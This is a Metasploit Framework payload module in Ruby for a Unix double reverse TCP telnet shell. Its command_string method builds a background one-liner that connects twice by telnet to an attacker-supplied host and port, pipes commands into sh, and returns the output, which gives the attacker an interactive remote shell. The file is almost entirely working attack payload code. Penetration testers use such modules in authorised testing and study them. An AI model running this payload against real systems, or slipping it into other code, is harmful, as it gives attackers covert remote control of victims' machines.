##
# $Id: reverse.rb 6059 2009-01-02 21:21:10Z egypt $
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/projects/Framework/
##


require 'msf/core'
require 'msf/core/handler/reverse_tcp_double'
require 'msf/base/sessions/command_shell'


module Metasploit3

	include Msf::Payload::Single

	def initialize(info = {})
		super(merge_info(info,
			'Name'          => 'Unix Command Shell, Double reverse TCP (telnet)',
			'Version'       => '$Revision: 6059 $',
			'Description'   => 'Creates an interactive shell through two inbound connections',
			'Author'        => 'hdm',
			'License'       => MSF_LICENSE,
			'Platform'      => 'unix',
			'Arch'          => ARCH_CMD,
			'Handler'       => Msf::Handler::ReverseTcpDouble,
			'Session'       => Msf::Sessions::CommandShell,
			'PayloadType'   => 'cmd',
			'Payload'       =>
				{
					'Offsets' => { },
					'Payload' => ''
				}
			))
	end

	#
	# Constructs the payload
	#
	def generate
		return super + command_string
	end
	
	#
	# Returns the command string to use for execution
	#
	def command_string
		cmd =
			"(sleep #{3600+rand(1024)}|" +
			"telnet #{datastore['LHOST']} #{datastore['LPORT']}|" +
			"while : ; do sh && break; done 2>&1|" +
			"telnet #{datastore['LHOST']} #{datastore['LPORT']}" +
			" >/dev/null 2>&1 &)"
		return cmd
	end

end
